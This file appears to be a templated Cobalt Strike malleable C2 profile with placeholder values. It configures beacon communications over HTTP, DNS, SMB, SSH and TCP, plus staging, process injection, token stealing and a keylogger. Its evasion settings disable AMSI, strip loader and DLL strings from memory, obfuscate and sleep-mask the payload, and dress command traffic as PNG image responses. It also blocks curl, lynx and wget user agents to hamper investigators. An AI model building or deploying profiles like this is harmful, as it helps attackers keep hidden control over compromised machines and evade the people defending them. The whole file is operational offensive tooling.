################################################
## Profile Name
################################################
set sample_name "{{ samplename }}";

################################################
## Sleep Times
################################################
set sleeptime "{{ sleeptime }}";
set jitter    "{{ jitter }}";

################################################
##  Server Response Size jitter
################################################
set data_jitter "{{ datajitter }}";

################################################
## Beacon User-Agent
################################################
set useragent "{{ beaconuseragent }}";

################################################
## SSL CERTIFICATE
################################################
https-certificate {
  {{ httpscertificatetype }}
}

################################################
## Task and Proxy Max Size
################################################
set tasks_max_size "1048576";
set tasks_proxy_max_size "921600";
set tasks_dns_proxy_max_size "71680";

################################################
## Access Token controls
################################################
set steal_token_access_mask "{{ accesstokencontrol }}";

################################################
## TCP Beacon
################################################
set tcp_port "{{ tcpport }}";
{{ randomtcpframeheader }} 

################################################
## SMB beacons
################################################
set pipename         "{{ smbbeaconoipename }}";
set pipename_stager  "{{ smbbeaconpipenamestager }}";
{{ randomsmbframeheader }}

################################################
## DNS beacons
################################################
dns-beacon {
    set dns_idle           "{{ dnsbeacondnsidle }}";
    set dns_max_txt        "{{ dnsbeacondnsmaxtxt }}";
    set dns_sleep          "{{ dnsbeacondnssleep }}";
    set dns_ttl            "{{ dnsbeacondnsttl }}";
    set maxdns             "{{ dnsbeaconmaxdns }}";
    set dns_stager_prepend ".{{ dnsbeacondnsstagerprepend }}";
    set dns_stager_subhost ".{{ dnsbeacondnsstagersubhost }}";
    set beacon             "{{ dnsbeaconbeacon }}";
    set get_A              "{{ dnsbeacongeta }}";
    set get_AAAA           "{{ dnsbeacongetaaaa }}";
    set get_TXT            "{{ dnsbeacongettxt }}";
    set put_metadata       "{{ dnsbeaconputmetadata }}";
    set put_output         "{{ dnsbeaconputoutput }}";
    set ns_response        "{{ dnsbeaconnsresponse }}";
}

################################################
## SSH beacons
################################################
set ssh_banner        "{{ sshbanner }}";
set ssh_pipename      "{{ sshpipename }}";


################################################
## Staging process
################################################
set host_stage "true";

http-stager {
    set uri_x86 "{{ httpsstagerurix86 }}";
    set uri_x64 "{{ httpstagerurix64 }}";

    server {
        header "Server" "{{ httpsstagerserverheader1 }}";
        header "Cache-Control" "max-age=0, no-cache";
        header "Pragma" "no-cache";
        header "Connection" "keep-alive";
        header "Content-Type" "image/png";
        output {
            prepend "{{ http_stager_server_prepend }}";
            append "{{ http_stager_server_append }}";
            print;
        }
    }

    client {
        header "Accept" "image/*, application/*";
        header "Accept-Language" "en-US,en;q=0.5";
        header "Accept-Encoding" "*";
    }
}

################################################
## Post Exploitation
################################################
post-ex {
    set spawnto_x86 "{{ postexspawntox86 }}";
    set spawnto_x64 "{{ postexspawntox64 }}";
    set obfuscate "{{ postexobfuscate }}";
    set smartinject "{{ postexsmartinject }}";
    set amsi_disable "{{ postexamsidisable }}";
    set pipename "{{ postexpipename }}";
    set keylogger "{{ postexkeylogger }}"; # options are GetAsyncKeyState or SetWindowsHookEx
}

################################################
## Memory Indicators
################################################
stage {
    {{ allocatorsettings }}
    set magic_mz_x86   "{{ stage_magic_mz_x86 }}";
    set magic_mz_x64   "{{ stage_magic_mz_x64 }}";
    set magic_pe       "{{ stage_magic_pe }}";
    set stomppe        "{{ memoryindicatorstomppe }}";
    set obfuscate      "{{ memoryindicatorobfuscate }}";
    set cleanup        "{{ memoryindicatorstagecleanup }}";
    set sleep_mask     "{{ memoryindicatorsleepmask }}";
    set smartinject    "{{ memoryindicatorsmartinject }}";
    set checksum       "0";
    set compile_time   "{{ stage_compile_time }}";
    set entry_point    "{{ stage_entry_point }}";
    set image_size_x86 "{{ stage_image_size_x86 }}";
    set image_size_x64 "{{ stage_image_size_x64 }}";
    set name           "{{ memoryindicatorname }}";
    set rich_header    "{{ stage_rich_header }}";

    transform-x86 {
        strrep "ReflectiveLoader" "{{ stage_transform_x86_strrep1 }}";
        strrep "This program cannot be run in DOS mode" "";
        strrep "beacon.dll" "";
    }
    transform-x64 {
        strrep "ReflectiveLoader" "{{ stage_transform_x64_strrep1 }}";
        strrep "beacon.x64.dll" "";
    }

    stringw "{{ samplename }}";
}

################################################
## Process Injection
################################################
process-inject {
    set bof_allocator "{{ procinjectionbofallocator }}";
    set bof_reuse_memory "{{ procinjectionreusemem }}";
    set allocator "{{ procinjectionallocator }}";
    set min_alloc "{{ procinjectionminalloc }}";
    set startrwx "false";
    set userwx   "false";

    transform-x86 {
        append "{{ process_inject_transform_x86_append }}";
    }

    transform-x64 {
        append "{{ process_inject_transform_x64_append }}";
    }
}

################################################
## HTTP Headers
################################################
http-config {
    set headers "Date, Server, Content-Length, Keep-Alive, Connection, Content-Type";
    header "Server" "{{ httpconfigserverheader }}";
    header "Keep-Alive" "timeout=10, max=100";
    header "Connection" "Keep-Alive";
    set trust_x_forwarded_for "{{ httpconfigtrustxforward }}";
    set block_useragents "curl*,lynx*,wget*";
}

################################################
## HTTP GET
################################################
http-get {
    set uri "{{ httpgeturi }}";
    set verb "GET";

    client {

        header "Accept" "image/*, application/*";
        header "Accept-Language" "en-US,en;q=0.5";
        header "Accept-Encoding" "*";

        metadata {
            mask;
            {{ http_get_client_metadata_transform }};
            prepend "{{ http_get_client_metadata_prepend }}";
            header "Cookie";
        }
    }

    server {

        header "Server" "{{ httpgetserverheader }}";
        header "Cache-Control" "max-age=0, no-cache";
        header "Pragma" "no-cache";
        header "Connection" "keep-alive";
        header "Content-Type" "image/png;";
        output {
            mask;
            {{ http_get_server_transform }};
            prepend "{{ http_get_server_prepend }}";
            append "{{ http_get_server_append }}";
            print;
        }
    }
}

################################################
## HTTP POST
################################################
http-post {
    set uri "{{ httpposturi }}";
    set verb "POST";

    client {
        header "Accept" "image/*, application/*";
        header "Accept-Language" "en-US,en;q=0.5";
        header "Accept-Encoding" "*";

        id {
            mask;
            {{ http_post_client_id_transform }};
            parameter "{{ http_post_client_id_parameter }}";
        }

        output {
            mask;
            {{ http_post_client_output_transform }};
            print;
        }
    }

    server {

        header "Server" "{{ httppostserverheader }}";
        header "Cache-Control" "max-age=0, no-cache";
        header "Pragma" "no-cache";
        header "Connection" "keep-alive";
        header "Content-Type" "image/png;";

        output {
            mask;
            {{ http_post_server_transform }};
            prepend "{{ http_post_server_prepend }}";
            append "{{ http_post_server_append }}";
            print;
        }
    }
}

